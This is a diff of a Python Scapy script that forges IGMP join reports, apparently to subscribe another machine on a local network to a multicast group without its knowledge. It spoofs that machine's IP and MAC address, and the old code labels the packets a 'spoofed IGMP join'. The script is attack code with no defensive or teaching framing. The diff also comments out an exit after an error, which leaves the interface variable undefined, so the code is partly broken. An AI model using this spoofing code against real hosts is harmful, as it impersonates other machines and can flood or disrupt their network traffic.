@@ -4,23 +4,31 @@ from scapy.all import *
 from scapy.all import show_interfaces
 from scapy.all import sendp, Ether, IP, IPOption
 from scapy.contrib.igmp import IGMP  # IGMP is a contributed module
+from scapy.all import *
+from scapy.contrib.igmpv3 import IGMPv3, IGMPv3gr
 
 MULTICAST_GROUP = '239.1.1.1'
 TARGET_IP = '192.168.0.200'
 TARGET_MAC = '04:7C:16:80:A5:71'
 INTERFACE_INDEX = 2
 
-def remote_subscribe_pc(target_pc_ip:str, target_pc_mac:str,
-                        multicast_group:str, iface_obj:int):
-    # 1. Craft Layers
-    eth = Ether(src=target_pc_mac)
-    ra_opt = IPOption(copy_flag=1, optclass=0, option=20, value=b'\x00\x00')
-    ip = IP(src=target_pc_ip, dst=multicast_group, ttl=1, options=[ra_opt])
-    igmp = IGMP(type=0x16, gaddr=multicast_group)
-    
-    # 2. Send (using the actual object)
-    print(f"[*] Sending spoofed IGMP join for {target_pc_ip}...")
-    sendp(eth/ip/igmp, iface=iface_obj, verbose=False)
+def get_multicast_mac(ip_address):
+    """Calculates the Ethernet Multicast MAC for a given IPv4 multicast address."""
+    ip_octets = [int(octet) for octet in ip_address.split('.')]
+    # Take the last 23 bits of the IP address
+    mac_bytes = [0x01, 0x00, 0x5e, ip_octets[1] & 0x7f, ip_octets[2], ip_octets[3]]
+    return ':'.join(f'{b:02x}' for b in mac_bytes)
+
+def remote_subscribe_v3(target_pc_ip, target_pc_mac, multicast_group, iface_obj):
+    # IGMPv3 Reports always go to 224.0.0.22
+    eth = Ether(src=target_pc_mac, dst=get_multicast_mac(multicast_group))
+    ip = IP(src=target_pc_ip, dst="224.0.0.22", ttl=1, options=[IPOption_Router_Alert()])
+
+    # Create a Group Record (type 4 = CHANGE_TO_EXCLUDE_MODE, which is a "Join")
+    gr = IGMPv3gr(rtype=4, maddr=multicast_group)
+    igmp = IGMPv3(type=0x22, records=[gr])
+
+    sendp(eth/ip/igmp, iface=iface_obj)
 
 if __name__ == "__main__":
     show_interfaces()
@@ -29,9 +37,9 @@ if __name__ == "__main__":
         my_iface = conf.ifaces.dev_from_index(INTERFACE_INDEX)
     except KeyError:
         print("Error: Interface index 2 not found!")
-        exit()
+        #exit()
 
-    remote_subscribe_pc(target_pc_ip=TARGET_IP,
+    remote_subscribe_v3(target_pc_ip=TARGET_IP,
                         target_pc_mac=TARGET_MAC,
                         multicast_group=MULTICAST_GROUP,
                         iface_obj=my_iface)
